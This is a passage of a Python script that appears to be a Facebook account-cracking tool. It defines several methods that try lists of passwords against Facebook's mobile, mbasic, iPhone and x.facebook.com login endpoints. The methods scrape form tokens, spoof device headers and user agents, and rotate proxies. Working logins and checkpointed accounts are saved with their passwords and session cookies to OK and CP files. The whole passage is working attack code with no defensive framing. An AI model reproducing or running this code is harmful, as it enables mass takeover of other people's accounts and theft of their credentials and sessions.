			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				#tree.add(f"[bold green]{tahun(idf)}")
				tree.add(f"[bold green]{idf}|{pw}")
				tree.add(f"[bold purple]{ua}\n")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ METODE MOBILE V2 ]-----------------#
def crackmobilev2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(["Mozilla/5.0 (Linux; Android 12; F-51B Build/V50RD66B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 Instagram 278.0.0.21.117 Android (31/12; 320dpi; 720x1366; FCNT; F-51B; F51B; qcom; ja_JP; 464315250)", "Mozilla/5.0 (Linux; Android 9; KFONWI Build/PS7327.3326N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Safari/537.36 Instagram 274.0.0.26.90 Android (28/9; 213dpi; 800x1216; Amazon; KFONWI; onyx; mt8168; en_US; 456141748)"]) 
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k}Validate M. facebook{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=163543514909045&kid_directed_site=0&app_id=163543514909045&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D163543514909045%26cbt%3D1679436163204%26e2e%3D%257B%2522init%2522%253A1679436163204%257D%26ies%3D1%26sdk%3Dandroid-11.2.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%26state%3D%257B%25220_auth_logger_id%2522%253A%252242236584-c16e-45cf-9ea6-6741c73dfc22%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522eg49esps5qidtbe77a0l%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.lemon.lvoverseas%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D42236584-c16e-45cf-9ea6-6741c73dfc22%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.lemon.lvoverseas%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252242236584-c16e-45cf-9ea6-6741c73dfc22%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522eg49esps5qidtbe77a0l%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'prefill_contact_point': idf, 'prefill_source': 'browser_dropdown', 'prefill_type': 'password', 'first_prefill_source': 'browser_onload', 'first_prefill_type': 'password', 'had_cp_prefilled': 'true', 'had_password_prefilled': 'true', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"cache-control":"max-age=0",
			"x-fb-rlafr":"0",
			"content-length": "2133",
			"upgrade-insecure-requsts":"1",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/v11.0/dialog/oauth?cct_prefetching=0&client_id=163543514909045&cbt=1679436163204&e2e=%7B%22init%22%3A1679436163204%7D&ies=1&sdk=android-11.2.0&sso=chrome_custom_tab&scope=public_profile&state=%7B%220_auth_logger_id%22%3A%2242236584-c16e-45cf-9ea6-6741c73dfc22%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22eg49esps5qidtbe77a0l%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.com.lemon.lvoverseas&auth_type=rerequest&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&ret=login&fbapp_pres=0&logger_id=42236584-c16e-45cf-9ea6-6741c73dfc22&tp=unspecified",
			"strict-transport-security":"max-age=15552000; preload",
			"cache-control":"private, no-cache, no-store, must-revalidate",
			"pragma":"no-cache",
			"x-fb-debug":"+REtnoLx14/3bprs21i4dxRnaSVYhdmooU7GqaSdrDs94BTwJRN1YT0BafYpfz4scD2MsNyLTKUwKaItS+ClSw==",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=163543514909045&auth_token=e5e53460ba8e24a7e850dbd43951b6ea&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D163543514909045%26cbt%3D1679436163204%26e2e%3D%257B%2522init%2522%253A1679436163204%257D%26ies%3D1%26sdk%3Dandroid-11.2.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%26state%3D%257B%25220_auth_logger_id%2522%253A%252242236584-c16e-45cf-9ea6-6741c73dfc22%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522eg49esps5qidtbe77a0l%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.lemon.lvoverseas%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D42236584-c16e-45cf-9ea6-6741c73dfc22%26tp%3Dunspecified&refsrc=deprecated&app_id=163543514909045&cancel=fbconnect%3A%2F%2Fcct.com.lemon.lvoverseas%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252242236584-c16e-45cf-9ea6-6741c73dfc22%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522eg49esps5qidtbe77a0l%2522%257D&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade)
			if "checkpoint" in po.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				tree = Tree(" ")
				tree.add(f"[bold green]tahun akun{tahun(idf)}")
				#cetak(panel(f"[bold yellow]Checkpoint-Login")
				tree.add(f"\r{P2}User ID {P2}     : {K2}{idf}")
				tree.add(f"\r{P2}Password {P2}    : {K2}{pw}")
				tree.add(f"{K2}{ua}{P2}")
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				tree = Tree(" ")
				#cetak(panel(f"[bold green]Succes-Login[bold grey]")
				tree.add(f"\r{P2}User ID {P2}  : {H2}{idf}")
				tree.add(f"{P2}Password {P2} : {H2}{pw}")
				tree.add(f"{H3}{kuki}{P2}")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				akun.append(idf+'|'+pw) 
				ok+=1
				#cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE MBASIC ]-------------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen) 
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k}Asycn Mbasic.facebook{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=950160105669643&kid_directed_site=0&app_id=950160105669643&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D950160105669643%26scope%3Dpublic_profile%2Bemail%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%26redirect_uri%3Dhttps%253A%252F%252Fwww.nassfeld.at%252Fauth%252Foauth%252Fcheck%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da3c9e2da-62f8-4d27-8613-adbf1a26e11c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.nassfeld.at%2Fauth%2Foauth%2Fcheck%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'browser_onload',
'prefill_type': 'contact_point',
'first_prefill_source': 'browser_dropdown',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '0wGaAG1mwHwh8-t0BBBg9oqxK12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65wce09MKdw5Owk888C0l-q3q0ny1Awci1qw8W0iW220jG3qaw4kwbS1Lw9C0z82fw',
'__csr': '',
'__req': random.choice('abcdefghijklmnopqrstuvwxyz123456789'),
'__a': '',
'__user':0
}
			headers = {'Host': 'm.facebook.com','content-length': '2146','sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"','sec-ch-ua-mobile': '?1','user-agent':ua,'content-type': 'application/x-www-form-urlencoded','x-fb-lsd': 'AVqI9RPLQs0','x-asbd-id': '198387','save-data': 'on','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': 'https://m.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=950160105669643&kid_directed_site=0&app_id=950160105669643&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D950160105669643%26scope%3Dpublic_profile%2Bemail%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%26redirect_uri%3Dhttps%253A%252F%252Fwww.nassfeld.at%252Fauth%252Foauth%252Fcheck%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da3c9e2da-62f8-4d27-8613-adbf1a26e11c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.nassfeld.at%2Fauth%2Foauth%2Fcheck%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=950160105669643&auth_token=ac271a0b69b219581ad260574e470ce4&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D950160105669643%26scope%3Dpublic_profile%2Bemail%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%26redirect_uri%3Dhttps%253A%252F%252Fwww.nassfeld.at%252Fauth%252Foauth%252Fcheck%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da3c9e2da-62f8-4d27-8613-adbf1a26e11c%26tp%3Dunspecified&refsrc=deprecated&app_id=950160105669643&cancel=https%3A%2F%2Fwww.nassfeld.at%2Fauth%2Foauth%2Fcheck%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%23_%3D_&lwv=100',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(" ")
				#tree.add(f"[bold green]{tahun(idf)}")
				#cetak(panel(f"[bold yellow]Checkpoint-Login")
				tree.add(f"\r{P2}User ID {P2}     : {K2}{idf}")
				tree.add(f"\r{P2}Password {P2}    : {K2}{pw}")
				tree.add(f"{K2}{ua}{P2}")
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(" ")
				#cetak(panel(f"[bold green]Succes-Login[bold grey]")
				tree.add(f"\r{P2}User ID {P2}  : {H2}{idf}")
				tree.add(f"{P2}Password {P2} : {H2}{pw}")
				tree.add(f"{H3}{ua}{P2}")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE FREE]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = " Mozilla/5.0 (Linux; Android 9; KFONWI Build/PS7327.3326N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.160 Safari/537.36 Instagram 278.0.0.21.117 Android (28/9; 213dpi; 800x1216; Amazon; KFONWI; onyx; mt8168; en_GB; 464315241)"
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k}Reguler Free.facebook{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=344190606773871&kid_directed_site=0&app_id=344190606773871&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fclient_id%3D344190606773871%26redirect_uri%3Dhttps%253A%252F%252Fauthenticate.riotgames.com%252Fredirects%252Ffacebook%26state%3D08703c02ec4042266f3c6ab05ea0a3d6b2663d5f5695d47498554fdfbbec%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D89175d0c-f4d1-4769-a7da-7a5b95d4eb0e%26tp%3Dunspecified%26cbt%3D1677471599751&cancel_url=https%3A%2F%2Fauthenticate.riotgames.com%2Fredirects%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D08703c02ec4042266f3c6ab05ea0a3d6b2663d5f5695d47498554fdfbbec%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr')
			suhk = par(p.text, "html.parser")
			xxxx = suhk.find("form",{"method":"post"})["action"]
			date = {
			"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
			"email":idf, 
			"next":"https://mobile.facebook.com/v13.0/dialog/oauth?client_id=344190606773871&redirect_uri=https%3A%2F%2Fauthenticate.riotgames.com%2Fredirects%2Ffacebook&state=08703c02ec4042266f3c6ab05ea0a3d6b2663d5f5695d47498554fdfbbec&scope=email&ret=login&fbapp_pres=0&logger_id=89175d0c-f4d1-4769-a7da-7a5b95d4eb0e&tp=unspecified&cbt=1677471599751&_rdr",
			"pass":pw,
			"login":"submit"
			}
			po = ses.post(f"https://m.facebook.com{xxxx}", data=date,headers={"user-agent":ua,},allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(" ")
				#tree.add(f"[bold green]{tahun(idf)}")
				#cetak(panel(f"[bold yellow]Checkpoint-Login")
				tree.add(f"\r{P2}User ID {P2}     : {K2}{idf}")
				tree.add(f"\r{P2}Password {P2}    : {K2}{pw}")
				tree.add(f"{K2}{ua}{P2}")
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(" ")
				#cetak(panel(f"[bold green]Succes-Login[bold grey]")
				tree.add(f"\r{P2}User ID {P2}  : {H2}{idf}")
				tree.add(f"{P2}Password {P2} : {H2}{pw}")
				tree.add(f"{H3}{ua}{P2}")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ METODE LAWAK V1]--------------------#
def cracklawakv1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen) 
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k}iphone.facebook{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link=ses.get('https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': idf, 
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': 'header',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true', 
'had_password_prefilled': 'true', 
'is_smart_lock': 'false', 
'bi_xrwh': 0
}
			heade ={'Host':'iphone.facebook.com','x-fb-rlafr': '0','access-control-allow-origin':'*','strict-transport-security':'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug':'6kPPqq1tVlNAOQKlMbyQJKyIsCy+xVvedl1dnfzMw+SSrLi3buNNbTwQ+EKhqari1Co/wiELTB87WFOow+VCZw==','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="113", "Not=A?Brand";v="99","Google Chrome";v="113"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://iphone.facebook.com','content-type': 'application/x-javascript; charset=utf-8','user-agent': ua,'accept':'*/*','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer':'https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9','accept-encoding': 'gzip, deflate,br','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://iphone.facebook.com/login/device-based/login/async/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&refsrc=deprecated&lwv=101',data=data,headers=heade)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[bold yellow]{idf}|{pw}")
				tree.add(f"[bold yellow]{ua}\n")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				tree.add(f"[bold green]{idf}|{pw}")
				tree.add(f"[bold green]{kuki}")
				tree.add(f"[bold green]{ua}\n")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ METHOD LAWAK V2 ]--------------------#
def cracklawakv2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	#ua = useragent()
	ua = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}Lawak V2{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			link = ses.get('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'provided_or_soft_matched',
'prefill_type': 'contact_point',
'first_prefill_source': 'provided_or_soft_matched',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '0wGaAG1mwHwh8-t0BBBg9oqxK12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65wce09MKdw5Owk888C0l-q3q0ny1Awci1qw8W0iW220jG3qaw4kwbS1Lw9C0z82fw',
'__csr': '',
'__req': random.choice('abcdefghijklmnopqrstuvwxyz123456789'),
'__a': '',
'__user':0
}
			heade = {
'Host':'x.facebook.com',
'x-fb-rlafr': '0',
'access-control-allow-origin': '*',
'pragma': 'no-cache',
'cache-control': 'private, no-cache, no-store, must-revalidate',
'x-fb-lsd':'AVqUJPZ_4-8',
'x-fb-asbd-id':'198387',
'x-fb-debug':'Ar808puA9haE5G4ec9zVAcFGinnes6bGoqixLonN/y5Q6rn9EcYoI4u3yLxGxJDpKRXuHAOiLuDHUPAeSTdPtg==',
'content-length':'2052',
'cache-control': 'max-age=0',
'save-data': 'on',
'upgrade-insecure-requests':'1',
'strict-transport-security':'max-age=15552000; preload',
'sec-ch-ua':'"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
'sec-ch-ua-mobile':'?1',
'user-agent':ua,
'content-type':'application/x-www-form-urlencoded',
'sec-ch-ua-platform': '"Android"',
'accept': '*/*',
'origin': 'https://x.facebook.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer':'https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
'accept-encoding':'gzip, deflate',
'accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'
}
			po = ses.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=heade)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[bold yellow]{idf}|{pw}")
				tree.add(f"[bold yellow]{ua}\n")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
